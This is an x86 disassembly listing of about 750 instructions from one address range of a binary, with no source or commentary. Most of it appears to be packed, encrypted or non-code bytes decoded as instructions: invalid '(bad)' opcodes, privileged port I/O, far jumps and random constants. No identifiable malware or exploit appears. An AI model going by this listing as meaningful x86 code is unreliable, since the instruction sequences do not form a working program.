  40bc40:	mov    dl,0x4a
  40bc42:	cmp    al,0x9d
  40bc44:	outs   dx,DWORD PTR ds:[esi]
  40bc45:	mov    ecx,0xfa2f6a53
  40bc4a:	mov    esi,0x10c6f8b4
  40bc4f:	pop    ecx
  40bc50:	ret    0x2f0f
  40bc53:	stos   DWORD PTR es:[edi],eax
  40bc54:	sub    al,BYTE PTR [esi-0x23a3db8a]
  40bc5a:	mov    ch,0x5b
  40bc5c:	inc    DWORD PTR [ebp+0x11942ec5]
  40bc62:	jecxz  0x40bcbd
  40bc64:	add    al,0x3
  40bc66:	sbb    dh,BYTE PTR [esi]
  40bc68:	add    ebp,DWORD PTR [ebx+0x58]
  40bc6b:	adc    ebp,DWORD PTR [esi+0x2c16a5f7]
  40bc71:	jb     0x40bc5a
  40bc73:	pushf  
  40bc74:	lock int 0x50
  40bc77:	add    BYTE PTR [eax+0x2a],ch
  40bc7a:	jecxz  0x40bc97
  40bc7c:	xor    BYTE PTR [ecx],al
  40bc7e:	xchg   ebp,eax
  40bc7f:	mov    al,ds:0x5cc767c1
  40bc84:	xor    eax,0x6e039024
  40bc89:	adc    cl,ah
  40bc8b:	retf   
  40bc8c:	pop    ecx
  40bc8d:	and    ah,cl
  40bc8f:	push   ss
  40bc90:	(bad)  
  40bc91:	mov    eax,0xa63252dc
  40bc97:	pop    esi
  40bc98:	ret    0x1207
  40bc9b:	xchg   edi,eax
  40bc9c:	mov    bl,0x19
  40bc9e:	sub    DWORD PTR [eax],eax
  40bca0:	cmc    
  40bca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bca2:	lahf   
  40bca3:	cs mov ah,0x61
  40bca6:	cli    
  40bca7:	mul    BYTE PTR [ecx+0x5ab6c14b]
  40bcad:	sub    al,0x29
  40bcaf:	mov    ch,0x1
  40bcb1:	pop    ss
  40bcb2:	cdq    
  40bcb3:	push   edi
  40bcb4:	adc    al,0xef
  40bcb6:	lea    ecx,[ebx-0x54]
  40bcb9:	ins    BYTE PTR es:[edi],dx
  40bcba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcbb:	aam    0x20
  40bcbd:	adc    al,0x37
  40bcbf:	std    
  40bcc0:	dec    ecx
  40bcc1:	xchg   DWORD PTR [ecx+0x7609dff1],esp
  40bcc7:	push   esi
  40bcc8:	and    edx,edi
  40bcca:	mov    bl,0x47
  40bccc:	cmp    al,BYTE PTR [ebx-0x46dc0318]
  40bcd2:	scas   al,BYTE PTR es:[edi]
  40bcd3:	pop    esp
  40bcd4:	mov    al,BYTE PTR [ecx+0x5d]
  40bcd7:	jmp    0xe2e2:0x391f9743
  40bcde:	xchg   esp,eax
  40bcdf:	adc    BYTE PTR [ebx+eiz*2+0x5989960a],ah
  40bce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce7:	into   
  40bce8:	jns    0x40bd36
  40bcea:	(bad)  
  40bceb:	sbb    ebx,DWORD PTR [edi-0x26a035fd]
  40bcf1:	fimul  DWORD PTR [edi]
  40bcf3:	mov    dl,0xeb
  40bcf5:	pop    ss
  40bcf6:	or     dh,BYTE PTR [ebp+0x58]
  40bcf9:	pushf  
  40bcfa:	into   
  40bcfb:	stos   BYTE PTR es:[edi],al
  40bcfc:	pop    ss
  40bcfd:	push   es
  40bcfe:	nop
  40bcff:	push   ebp
  40bd00:	into   
  40bd01:	inc    ebp
  40bd02:	cmp    al,0x49
  40bd04:	(bad)  
  40bd05:	(bad)  
  40bd06:	pop    ss
  40bd07:	sub    ah,dl
  40bd09:	mov    cl,0x92
  40bd0b:	(bad)  
  40bd0c:	xor    DWORD PTR [ebx],eax
  40bd0e:	inc    eax
  40bd0f:	xor    dl,BYTE PTR [esi]
  40bd11:	lods   al,BYTE PTR ds:[esi]
  40bd12:	inc    esi
  40bd13:	(bad)  
  40bd14:	mov    esi,0xf25bd38a
  40bd19:	je     0x40bd1d
  40bd1b:	jb     0x40bd9b
  40bd1d:	xchg   edx,eax
  40bd1e:	adc    ah,BYTE PTR [ecx+0x1b539eeb]
  40bd24:	jp     0x40bd52
  40bd26:	popa   
  40bd27:	inc    ebx
  40bd28:	call   DWORD PTR [esi+eiz*1-0x25]
  40bd2c:	pushf  
  40bd2d:	mov    dl,BYTE PTR [ebx+0x7a]
  40bd30:	mov    edx,0xb1d239b0
  40bd35:	lock inc edi
  40bd37:	dec    eax
  40bd38:	mov    ds:0xe28e7b53,al
  40bd3d:	pop    eax
  40bd3e:	outs   dx,DWORD PTR ds:[esi]
  40bd3f:	mov    bh,0x8
  40bd41:	sbb    eax,DWORD PTR [edi-0x76efd53b]
  40bd47:	sub    ah,ch
  40bd49:	pop    ss
  40bd4a:	adc    BYTE PTR [edx+0x53],al
  40bd4d:	push   cs
  40bd4e:	in     eax,dx
  40bd4f:	aad    0x81
  40bd51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd52:	ret    
  40bd53:	inc    esp
  40bd54:	push   es
  40bd55:	fsub   QWORD PTR [esi]
  40bd57:	ret    
  40bd58:	mov    DWORD PTR [ecx+0xa],eax
  40bd5b:	push   ecx
  40bd5c:	scas   eax,DWORD PTR es:[edi]
  40bd5d:	call   0x78c9:0x374ad445
  40bd64:	loop   0x40bd8c
  40bd66:	or     ch,al
  40bd68:	test   eax,0x6597686
  40bd6d:	push   ecx
  40bd6e:	jecxz  0x40bdec
  40bd70:	lods   al,BYTE PTR ds:[esi]
  40bd71:	test   al,0x22
  40bd73:	or     eax,0xeaf75747
  40bd78:	popa   
  40bd79:	je     0x40bd22
  40bd7b:	or     al,0x71
  40bd7d:	or     esi,DWORD PTR [eax+ebp*1]
  40bd80:	shl    edx,cl
  40bd82:	stos   DWORD PTR es:[edi],eax
  40bd83:	clc    
  40bd84:	jle    0x40bd0f
  40bd86:	addr16 jne 0x40bd26
  40bd89:	out    0x7e,al
  40bd8b:	inc    edx
  40bd8c:	and    bh,BYTE PTR [edx+0x5c9ac550]
  40bd92:	adc    esp,DWORD PTR [edi+0x68]
  40bd95:	fucomip st,st(4)
  40bd97:	imul   edx,DWORD PTR ds:0xf17cc5a3,0x6
  40bd9e:	jbe    0x40be0c
  40bda0:	(bad)  
  40bda1:	test   DWORD PTR [ebx+0x7c83d477],edi
  40bda7:	push   ebx
  40bda8:	mov    ebx,0x4f301af6
  40bdad:	xchg   ecx,eax
  40bdae:	outs   dx,BYTE PTR ds:[esi]
  40bdaf:	pop    esp
  40bdb0:	(bad)  
  40bdb1:	stos   DWORD PTR es:[edi],eax
  40bdb2:	sbb    BYTE PTR [edi+0x0],dl
  40bdb5:	add    edi,DWORD PTR [ebx]
  40bdb7:	mov    ecx,0x712350f2
  40bdbc:	inc    ebx
  40bdbd:	out    0x6b,al
  40bdbf:	mov    ecx,0xdc5f304a
  40bdc4:	(bad)  
  40bdc5:	and    dl,BYTE PTR [edx]
  40bdc7:	cmp    dl,dl
  40bdc9:	loope  0x40bde6
  40bdcb:	icebp  
  40bdcc:	adc    eax,0xf4b86e29
  40bdd1:	mov    esi,0x68c4d920
  40bdd6:	xchg   esi,eax
  40bdd7:	outs   dx,DWORD PTR ds:[esi]
  40bdd8:	pop    ecx
  40bdd9:	jae    0x40be3f
  40bddb:	icebp  
  40bddc:	(bad)  
  40bddd:	hlt    
  40bdde:	lahf   
  40bddf:	stc    
  40bde0:	icebp  
  40bde1:	(bad)  
  40bde2:	aad    0xf
  40bde4:	shl    ebp,0x89
  40bde7:	dec    eax
  40bde8:	mov    edi,0xea85c8e
  40bded:	xor    BYTE PTR [ebp+edi*8-0x70],bl
  40bdf1:	fistp  QWORD PTR [ebp+ebp*8+0x12]
  40bdf5:	jno    0x40bda0
  40bdf7:	sub    esi,esi
  40bdf9:	pusha  
  40bdfa:	xor    DWORD PTR [edx-0x3a],esp
  40bdfd:	push   esi
  40bdfe:	iret   
  40bdff:	(bad)  [eax+0x4]
  40be02:	mov    cl,0x97
  40be04:	or     eax,0xf1699bd3
  40be09:	aaa    
  40be0a:	sti    
  40be0b:	jge    0x40be22
  40be0d:	jne    0x40be1d
  40be0f:	sbb    BYTE PTR [edi],cl
  40be11:	mov    dh,0x92
  40be13:	jbe    0x40bdc1
  40be15:	ja     0x40be10
  40be17:	mov    dh,0x9f
  40be19:	shl    DWORD PTR [edx],0x46
  40be1c:	pop    edi
  40be1d:	cmp    ah,bl
  40be1f:	add    ch,BYTE PTR [eax]
  40be21:	cmp    esi,DWORD PTR [edi+ebp*4-0x21]
  40be25:	and    al,0x13
  40be27:	cmp    cl,BYTE PTR [esi]
  40be29:	cli    
  40be2a:	xor    ch,BYTE PTR [esi]
  40be2c:	pop    es
  40be2d:	push   eax
  40be2e:	loope  0x40be74
  40be30:	cmp    al,0xca
  40be32:	xchg   esp,eax
  40be33:	mov    eax,ds:0xeff71419
  40be38:	adc    BYTE PTR [ebp+0x2f813ca6],ah
  40be3e:	mov    esp,0x3485d3e7
  40be43:	imul   eax
  40be45:	outs   dx,DWORD PTR ds:[esi]
  40be46:	jmp    0x1338:0x1af95cf4
  40be4d:	xor    ah,bh
  40be4f:	and    al,0x7d
  40be51:	lods   eax,DWORD PTR ds:[esi]
  40be52:	pop    ss
  40be53:	lahf   
  40be54:	jge    0x40bed4
  40be56:	or     eax,0x32dbd79e
  40be5b:	mov    ch,0x3c
  40be5d:	cld    
  40be5e:	mov    eax,ds:0x9a1c0099
  40be63:	daa    
  40be64:	or     al,0xde
  40be66:	mov    ds:0x45bebe65,eax
  40be6b:	rcl    BYTE PTR [edi],cl
  40be6d:	in     al,dx
  40be6e:	out    dx,eax
  40be6f:	test   al,0xae
  40be71:	jl     0x40be01
  40be73:	pusha  
  40be74:	xor    eax,0x84206917
  40be79:	xchg   esi,eax
  40be7a:	stc    
  40be7b:	(bad)  
  40be7c:	arpl   WORD PTR [edi+0x71b7e32a],di
  40be82:	int3   
  40be83:	inc    eax
  40be84:	lds    ebp,FWORD PTR [eax-0x2b7f4120]
  40be8a:	jne    0x40bead
  40be8c:	dec    ebx
  40be8d:	cmp    ebp,ebp
  40be8f:	aam    0xac
  40be91:	push   ss
  40be92:	dec    edi
  40be93:	jbe    0x40bebd
  40be95:	je     0x40be5c
  40be97:	push   esi
  40be98:	nop
  40be99:	cmp    DWORD PTR [ebx+0x5b],ebx
  40be9c:	ds mov bh,0x75
  40be9f:	(bad)  
  40bea0:	xchg   esp,eax
  40bea1:	or     eax,0xaf778e05
  40bea6:	into   
  40bea7:	js     0x40bec0
  40bea9:	mov    ebp,edi
  40beab:	push   0xffffffcc
  40bead:	jae    0x40befc
  40beaf:	scas   al,BYTE PTR es:[edi]
  40beb0:	and    DWORD PTR [ecx-0x4b64c800],edx
  40beb6:	xchg   BYTE PTR fs:[eax+0x22],bh
  40beba:	mov    bl,0x60
  40bebc:	mov    ebx,0x11f2e888
  40bec1:	sbb    cl,BYTE PTR ds:0xd66e6a0f
  40bec7:	(bad)  
  40bec9:	enter  0xe1fb,0x7c
  40becd:	add    al,0x66
  40becf:	sar    BYTE PTR [esi],cl
  40bed1:	sub    esi,ebx
  40bed3:	loope  0x40bf27
  40bed5:	pop    ss
  40bed6:	shl    DWORD PTR [ecx+0x73],cl
  40bed9:	pop    ebp
  40beda:	and    eax,0xbbf03f84
  40bedf:	test   BYTE PTR [ebx+0x66],ah
  40bee2:	or     cl,bh
  40bee4:	int    0x78
  40bee6:	pop    edi
  40bee7:	jg     0x40bf41
  40bee9:	js     0x40bec1
  40beeb:	out    dx,eax
  40beec:	sti    
  40beed:	aaa    
  40beee:	push   esp
  40beef:	adc    eax,0xa69cccb5
  40bef4:	rol    dl,1
  40bef6:	retf   0x4ff9
  40bef9:	(bad)  
  40befa:	jno    0x40be7f
  40befc:	das    
  40befd:	and    esi,DWORD PTR [ecx]
  40beff:	mov    esi,DWORD PTR [esi+0xc]
  40bf02:	in     eax,0x99
  40bf04:	cmp    dl,BYTE PTR [edx+0x1d]
  40bf07:	in     eax,dx
  40bf08:	sub    cl,BYTE PTR [ebx+0x604126b7]
  40bf0e:	or     BYTE PTR [ecx-0x3c],bl
  40bf11:	ds std 
  40bf13:	fidiv  WORD PTR [esi+0x75c27aba]
  40bf19:	sub    ah,BYTE PTR [ebx+0xe]
  40bf1c:	mov    ds:0x79d413ce,al
  40bf21:	xchg   BYTE PTR [ebp-0x1172c1ca],ah
  40bf27:	push   edi
  40bf28:	jo     0x40bec3
  40bf2a:	pop    esp
  40bf2b:	stos   BYTE PTR es:[edi],al
  40bf2c:	test   BYTE PTR fs:[edi],cl
  40bf2f:	mov    dh,0x9b
  40bf31:	sub    DWORD PTR [ebx+0x364ecc5c],ebp
  40bf37:	pop    es
  40bf38:	or     DWORD PTR [ebx],0xffffffe2
  40bf3b:	and    al,0xca
  40bf3d:	xchg   BYTE PTR [ecx],bl
  40bf3f:	fidiv  WORD PTR [ecx+0x719b7395]
  40bf45:	stos   DWORD PTR es:[edi],eax
  40bf46:	jg     0x40bf15
  40bf48:	sbb    cl,bh
  40bf4a:	and    DWORD PTR [ecx],esp
  40bf4c:	push   ecx
  40bf4d:	inc    eax
  40bf4e:	sub    eax,0xff8fa3b6
  40bf53:	(bad)  
  40bf54:	fs sub al,0x9d
  40bf57:	mov    edi,fs
  40bf59:	mov    edi,0xc5430cbf
  40bf5e:	mov    ecx,0x3f72d7a4
  40bf63:	(bad)  
  40bf64:	nop
  40bf65:	dec    eax
  40bf66:	adc    BYTE PTR [edx-0x29b4a103],cl
  40bf6c:	mov    bh,0xab
  40bf6e:	scas   al,BYTE PTR es:[edi]
  40bf6f:	enter  0x509c,0x7f
  40bf73:	pop    ebp
  40bf74:	mov    al,ds:0xa06b827f
  40bf79:	xchg   esp,eax
  40bf7a:	pop    esi
  40bf7b:	mov    ebx,0x723e9679
  40bf80:	adc    dh,bh
  40bf82:	and    ebp,DWORD PTR [ebp+0x3c1fdc84]
  40bf88:	mov    ds:0x2efea3ba,al
  40bf8d:	mov    DWORD PTR [esp+eiz*4-0x7f],ecx
  40bf91:	xchg   edi,eax
  40bf92:	mov    cl,0x60
  40bf94:	jnp    0x40bf36
  40bf96:	sub    edx,DWORD PTR [esp+edi*4]
  40bf99:	lea    ecx,[eax-0x5f6392ff]
  40bf9f:	pop    ds
  40bfa0:	or     BYTE PTR [edi-0x35],al
  40bfa3:	inc    ebx
  40bfa4:	lock and DWORD PTR ss:[ebx],ebx
  40bfa8:	push   eax
  40bfa9:	mov    ?,WORD PTR [ebp+0x43e51a6d]
  40bfaf:	shr    edx,cl
  40bfb1:	mov    dl,0x10
  40bfb3:	pushf  
  40bfb4:	jmp    0x2d6:0xaafdb4e
  40bfbb:	push   cs
  40bfbc:	pop    ss
  40bfbd:	xchg   esi,eax
  40bfbe:	outs   dx,BYTE PTR ds:[esi]
  40bfbf:	cmp    esp,DWORD PTR [edx]
  40bfc1:	fistp  DWORD PTR [edi-0x2c5f3f9]
  40bfc7:	cmp    DWORD PTR [edi+0x77],ebx
  40bfca:	mov    bh,0xe
  40bfcc:	inc    esi
  40bfcd:	lock mov WORD PTR [eax],es
  40bfd0:	in     eax,0x7d
  40bfd2:	loope  0x40bfb9
  40bfd4:	dec    esp
  40bfd5:	cmp    cx,sp
  40bfd8:	push   es
  40bfd9:	mov    ecx,0x47d2a534
  40bfde:	lea    edi,[edx-0xd025b4f]
  40bfe4:	push   ebx
  40bfe5:	imul   edx,DWORD PTR [edx+eax*4-0x229d0776],0x48b1884a
  40bff0:	clc    
  40bff1:	jmp    0x5a2901a4
  40bff6:	aad    0x71
  40bff8:	adc    al,0x65
  40bffa:	or     edx,DWORD PTR [ecx-0x64]
  40bffd:	test   eax,0xa33709a1
  40c002:	add    al,0x74
  40c004:	stos   BYTE PTR es:[edi],al
  40c005:	ret    0x252a
  40c008:	cli    
  40c009:	xor    eax,0x4d436294
  40c00e:	inc    ebp
  40c00f:	fisttp DWORD PTR [edx]
  40c011:	inc    eax
  40c012:	mov    al,0xfa
  40c014:	stc    
  40c015:	dec    ecx
  40c016:	(bad)  [eax-0x5a]
  40c019:	and    dh,BYTE PTR [edi]
  40c01b:	sub    edx,DWORD PTR [ebx]
  40c01d:	int    0xeb
  40c01f:	mov    ds:0xc9bbdbfb,al
  40c024:	add    edi,edi
  40c026:	cmp    al,0xd7
  40c028:	add    ch,bh
  40c02a:	ins    DWORD PTR es:[di],dx
  40c02c:	or     eax,0x503ea67
  40c031:	sahf   
  40c032:	xor    DWORD PTR [ebx+0x53],0x1e
  40c036:	mov    ch,0x2b
  40c038:	push   ebp
  40c039:	(bad)  
  40c03a:	jmp    0x40bfc0
  40c03c:	dec    edi
  40c03d:	push   ecx
  40c03e:	sub    al,0xa7
  40c040:	and    esp,DWORD PTR [ebp-0x3c]
  40c043:	jnp    0x40c026
  40c045:	sbb    BYTE PTR [ebp+0x1dce6312],bl
  40c04b:	cmp    dl,BYTE PTR [ebx-0xcc53ce8]
  40c051:	(bad)
  40c054:	xor    eax,0xe55de02f
  40c059:	jle    0x40c071
  40c05b:	pop    ds
  40c05c:	adc    al,0xd8
  40c05e:	imul   eax,edx,0xffffffe6
  40c061:	xchg   edi,eax
  40c062:	xchg   edx,eax
  40c063:	in     eax,0x4c
  40c065:	out    0xbe,eax
  40c067:	sbb    DWORD PTR [ebx-0x77],0x23c6ef68
  40c06e:	xchg   edi,eax
  40c06f:	push   edx
  40c070:	add    ebx,DWORD PTR [edi+edx*4]
  40c073:	retf   
  40c074:	mov    al,ds:0x17ce50e4
  40c079:	fisub  DWORD PTR ds:0xe272a12e
  40c07f:	add    BYTE PTR [ecx],cl
  40c081:	adc    BYTE PTR [esi],bh
  40c083:	add    DWORD PTR [eax-0x9],esp
  40c086:	jmp    0x40c0e8
  40c088:	das    
  40c089:	mov    fs,WORD PTR [esi+0x50]
  40c08c:	sbb    esi,DWORD PTR [edi-0x1f96a76]
  40c092:	sti    
  40c093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c094:	mov    dh,ch
  40c096:	paddb  mm5,QWORD PTR [esp+edi*2+0x31d9ff17]
  40c09e:	cs dec esi
  40c0a0:	xor    bh,BYTE PTR [ebx-0x44b23212]
  40c0a6:	jg     0x40c09f
  40c0a8:	rcl    DWORD PTR [esi+ecx*2-0x3bacc0ca],0x90
  40c0b0:	inc    esi
  40c0b1:	fadd   st(2),st
  40c0b3:	push   ebp
  40c0b4:	fld    QWORD PTR [eax-0x67089459]
  40c0ba:	aas    
  40c0bb:	pushf  
  40c0bc:	pop    es
  40c0bd:	lea    esp,[edx-0x8]
  40c0c0:	ja     0x40c12c
  40c0c2:	into   
  40c0c3:	clc    
  40c0c4:	sub    al,BYTE PTR [edi+0xb5c9401]
  40c0ca:	pop    edi
  40c0cb:	adc    ecx,edi
  40c0cd:	jo     0x40c10f
  40c0cf:	sub    edi,DWORD PTR [ecx-0x14bef976]
  40c0d5:	mov    edi,tr3
  40c0d8:	or     eax,0x3bc7aea2
  40c0dd:	pop    edx
  40c0de:	and    eax,0xdc1d17e1
  40c0e3:	clc    
  40c0e4:	out    dx,eax
  40c0e5:	jecxz  0x40c0c6
  40c0e7:	sbb    DWORD PTR [esi],edi
  40c0e9:	jmp    0x40c12b
  40c0eb:	outs   dx,BYTE PTR ds:[esi]
  40c0ec:	jbe    0x40c0aa
  40c0ee:	pop    eax
  40c0ef:	push   ebx
  40c0f0:	push   0xb90c931e
  40c0f5:	sub    ecx,DWORD PTR [eax]
  40c0f7:	scas   eax,DWORD PTR es:[edi]
  40c0f8:	outs   dx,DWORD PTR ds:[esi]
  40c0f9:	dec    esp
  40c0fa:	clc    
  40c0fb:	or     al,0xd5
  40c0fd:	test   eax,0x29656ad3
  40c102:	or     al,0xed
  40c104:	call   0x197e:0x46b0647a
  40c10b:	and    BYTE PTR [ecx-0x1b],dl
  40c10e:	dec    eax
  40c10f:	daa    
  40c110:	mov    ebp,0xd9458ac3
  40c115:	mov    dl,0xc4
  40c117:	jns    0x40c18b
  40c119:	loop   0x40c09f
  40c11b:	mov    ds:0x86c1e12f,eax
  40c120:	and    al,0xfd
  40c122:	cmp    bh,BYTE PTR [ecx-0x72]
  40c125:	ret    
  40c126:	cld    
  40c127:	jmp    0x40c17c
  40c129:	or     dl,bh
  40c12b:	pop    esp
  40c12c:	pop    esp
  40c12d:	repnz in eax,dx
  40c12f:	push   edi
  40c130:	out    dx,eax
  40c131:	out    dx,eax
  40c132:	adc    DWORD PTR [esi+0xc],0xfbe0efe2
  40c139:	push   es
  40c13a:	pushf  
  40c13b:	jg     0x40c1aa
  40c13d:	jns    0x40c156
  40c13f:	pop    ds
  40c140:	pop    esi
  40c141:	stos   BYTE PTR es:[edi],al
  40c142:	(bad)  
  40c143:	mov    bl,0x18
  40c145:	aad    0x22
  40c147:	test   al,0x92
  40c149:	pushf  
  40c14a:	in     eax,dx
  40c14b:	sar    edx,cl
  40c14d:	mov    al,ds:0x24899e98
  40c152:	and    edx,edx
  40c154:	dec    eax
  40c155:	test   BYTE PTR [edx+0x759ab15],0x52
  40c15c:	test   eax,0xa0daef63
  40c161:	(bad)  
  40c162:	pop    esp
  40c163:	sbb    eax,ebx
  40c165:	jp     0x40c18d
  40c167:	lock fxch st(0)
  40c16a:	mov    bh,0x9f
  40c16c:	cmp    esp,DWORD PTR [esi-0x6bd4520b]
  40c172:	fcom   QWORD PTR [ebx+0x65]
  40c175:	mov    ah,ah
  40c177:	dec    ebx
  40c178:	add    al,BYTE PTR [ebp+0x6d]
  40c17b:	idiv   BYTE PTR [ebx+0x58]
  40c17e:	popa   
  40c17f:	gs mov ecx,0xe256c36b
  40c185:	xchg   esi,eax
  40c186:	clc    
  40c187:	in     al,0x9
  40c189:	push   esi
  40c18a:	mov    eax,ds:0x90193b59
  40c18f:	sbb    bh,ch
  40c191:	sbb    eax,0xf604f9d8
  40c196:	fisttp DWORD PTR [ebp-0x1c]
  40c199:	mov    esp,0x64af76b9
  40c19e:	and    al,0x65
  40c1a0:	arpl   bp,ax
  40c1a2:	jae    0x40c1a0
  40c1a4:	adc    BYTE PTR [edi+ebx*2+0x4775efda],0xa5
  40c1ac:	or     al,0x29
  40c1ae:	inc    ebx
  40c1af:	inc    eax
  40c1b0:	cmp    al,0x54
  40c1b2:	push   ebx
  40c1b3:	dec    BYTE PTR [edx]
  40c1b5:	sub    DWORD PTR [ebp-0x2d],0xffffffab
  40c1b9:	push   eax
  40c1ba:	xor    ecx,DWORD PTR [ebp-0x72a2aca7]
  40c1c0:	inc    edx
  40c1c1:	shl    BYTE PTR [ebx],0x42
  40c1c4:	sub    bh,BYTE PTR [si]
  40c1c7:	jbe    0x40c23b
  40c1c9:	xlat   BYTE PTR ds:[ebx]
  40c1ca:	mov    ah,0xcd
  40c1cc:	push   cs
  40c1cd:	ror    BYTE PTR [ebp-0x4],0xbe
  40c1d1:	popf   
  40c1d2:	add    BYTE PTR [edi-0x32],ch
  40c1d5:	js     0x40c1cf
  40c1d7:	jmp    0xb06d:0xe3f91322
  40c1de:	inc    edi
  40c1df:	(bad)  
  40c1e0:	mov    ah,0xc
  40c1e2:	scas   eax,DWORD PTR es:[edi]
  40c1e3:	sub    al,0x9f
  40c1e5:	push   esp
  40c1e6:	test   BYTE PTR [ebp-0x1a],al
  40c1e9:	fstp   QWORD PTR [edx+0xf]
  40c1ec:	std    
  40c1ed:	or     dl,dh
  40c1ef:	out    dx,al
  40c1f0:	push   edx
  40c1f1:	jge    0x40c219
  40c1f3:	and    DWORD PTR [ebx-0x50],eax
  40c1f6:	popa   
  40c1f7:	rcr    edi,1
  40c1f9:	pop    ebx
  40c1fa:	ret    0x1c52
  40c1fd:	cli    
  40c1fe:	(bad)  [esi+0x1]
  40c201:	pop    ss
  40c202:	je     0x40c228
  40c204:	add    eax,0x6ee0d014
  40c209:	push   cs
  40c20a:	push   esi
  40c20b:	mov    al,ds:0xe10384d7
  40c210:	xor    edi,DWORD PTR [ebp+eiz*8+0x13e6d890]
  40c217:	arpl   WORD PTR [ecx-0x15deb386],bx
  40c21d:	nop
  40c21e:	rcl    ch,cl
  40c220:	push   es
  40c221:	xchg   BYTE PTR [edx+eax*8],dl
  40c224:	jb     0x40c1ac
  40c226:	jo     0x40c285
  40c228:	mov    edx,0x51d74a61
  40c22d:	(bad)  
  40c22e:	out    0x8b,eax
  40c230:	add    ebp,DWORD PTR [ecx+0x7841bc99]
  40c236:	adc    al,0xad
  40c238:	inc    esi
  40c239:	xchg   edi,eax
  40c23a:	or     bh,BYTE PTR [ebp+edx*2+0x62]
  40c23e:	push   esi
  40c23f:	xchg   DWORD PTR [edx],esi
  40c241:	(bad)  
  40c242:	adc    esp,ecx
  40c244:	popf   
  40c245:	aas    
  40c246:	sub    cl,0x7e
  40c249:	inc    esp
  40c24a:	and    DWORD PTR [ecx-0x1ea4402f],esp
  40c250:	jo     0xcc848349
  40c256:	xor    al,0x9
  40c258:	pop    esp
  40c259:	xor    ebx,DWORD PTR [ecx]
  40c25b:	add    al,0xa9
  40c25d:	fdiv   DWORD PTR [ebx-0x54]
  40c260:	sti    
  40c261:	push   ebx
  40c262:	addr16 xchg esp,edi
  40c265:	scas   eax,DWORD PTR es:[edi]
  40c266:	int    0xf2
  40c268:	cli    
  40c269:	adc    DWORD PTR [edx+0x6b35a001],0x24
  40c270:	mov    ecx,0x8808b304
  40c275:	mov    bh,0x56
  40c277:	pop    es
  40c278:	mov    al,0xd
  40c27a:	in     eax,dx
  40c27b:	sahf   
  40c27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c27d:	stc    
  40c27e:	and    BYTE PTR [ebx+0x42bb3a33],dh
  40c284:	test   BYTE PTR [edi],ah
  40c286:	mov    eax,0xc793a079
  40c28b:	mov    esi,0xc281094b
  40c290:	mov    ch,ch
  40c292:	lds    ebp,FWORD PTR [esi]
  40c294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c295:	rol    BYTE PTR [ebx-0x74589974],1
  40c29b:	xor    ch,BYTE PTR [ecx-0x3e]
  40c29e:	add    al,0x50
  40c2a0:	stos   BYTE PTR es:[edi],al
  40c2a1:	adc    BYTE PTR [esi+0x50],bl
  40c2a4:	or     BYTE PTR [edx+0x14],bh
  40c2a7:	push   ecx
  40c2a8:	mov    bh,0x74
  40c2aa:	leave  
  40c2ab:	push   esi
  40c2ac:	loopne 0x40c287
  40c2ae:	jbe    0x40c315
  40c2b0:	mov    ss:0x411ba7e7,al
  40c2b6:	arpl   WORD PTR [ebx-0x43fe69c1],sp
  40c2bc:	inc    ebx
  40c2bd:	loopne 0x40c2e0
  40c2bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2c0:	push   ss
  40c2c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2c2:	adc    al,0x2a
  40c2c4:	pop    DWORD PTR [edi-0x39]
  40c2c7:	jmp    0x40c323
  40c2c9:	mov    es,edx
  40c2cb:	mov    ecx,0x874412ca
  40c2d0:	das    
  40c2d1:	out    dx,al
  40c2d2:	fsub   DWORD PTR [edi]
  40c2d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d5:	inc    edi
  40c2d6:	fstp   TBYTE PTR [eax-0x449d3733]
  40c2dc:	push   cs
  40c2dd:	loope  0x40c2ab
  40c2df:	outs   dx,BYTE PTR ds:[esi]
  40c2e0:	or     bl,bh
  40c2e2:	push   ebp
  40c2e3:	sub    ch,cl
  40c2e5:	je     0x40c333
  40c2e7:	arpl   bx,bp
  40c2e9:	out    dx,al
  40c2ea:	js     0x40c2e6
  40c2ec:	cmp    al,0x73
  40c2ee:	and    al,0x37
  40c2f0:	push   0xbf7b72bf
  40c2f5:	xor    esi,eax
  40c2f7:	cwde   
  40c2f8:	arpl   sp,sp
  40c2fa:	fild   QWORD PTR [edi+eiz*2]
  40c2fd:	cmp    dh,0xa
  40c300:	out    dx,eax
  40c301:	fdiv   QWORD PTR [edi-0x4c]
  40c304:	jmp    0x40c323
  40c306:	aas    
  40c307:	inc    esp
  40c308:	hlt    
  40c309:	mov    ecx,0x29fb85e9
  40c30e:	cld    
  40c30f:	xchg   dl,bl
  40c311:	xchg   esi,eax
  40c312:	rcl    BYTE PTR [edx],1
  40c314:	add    DWORD PTR [esi-0xf973265],ebp
  40c31a:	ror    ebx,1
  40c31c:	(bad)  
  40c31d:	mov    WORD PTR [eax+0x47feb08e],cs
  40c323:	idiv   BYTE PTR [eax]
  40c325:	outs   dx,BYTE PTR ds:[esi]
  40c326:	push   edi
  40c327:	sub    al,0xea
  40c329:	cmp    DWORD PTR [ecx+eax*4+0x4c],ebx
  40c32d:	jae    0x40c379
  40c32f:	std    
  40c330:	pop    ds
  40c331:	add    eax,0x692901d3
  40c336:	pop    es
  40c337:	cmp    DWORD PTR [ebp+edi*4-0x14b21973],eax
  40c33e:	and    DWORD PTR [eax+0x30990c56],ebp
  40c344:	add    eax,DWORD PTR [ecx]
  40c346:	in     al,0x46
  40c348:	ficom  WORD PTR [edx+eax*1-0x1a]
  40c34c:	(bad)  
  40c34d:	jmp    0x40c310
  40c34f:	mov    BYTE PTR [ebx-0x6f],bh
  40c352:	sbb    al,0x64
  40c354:	dec    esi
  40c355:	ret    0x1d49
  40c358:	jmp    0x40c314
  40c35a:	lods   eax,DWORD PTR ds:[esi]
  40c35b:	mov    ecx,0xa02d7ef7
  40c360:	mov    edi,0x538ee9bc
  40c365:	and    al,0x23
  40c367:	je     0x40c375
  40c369:	add    edx,DWORD PTR [esi-0x381897bc]
  40c36f:	sub    DWORD PTR [edx-0x6e],0xffffff89
  40c373:	imul   eax,DWORD PTR gs:[ecx],0xf5ad3621
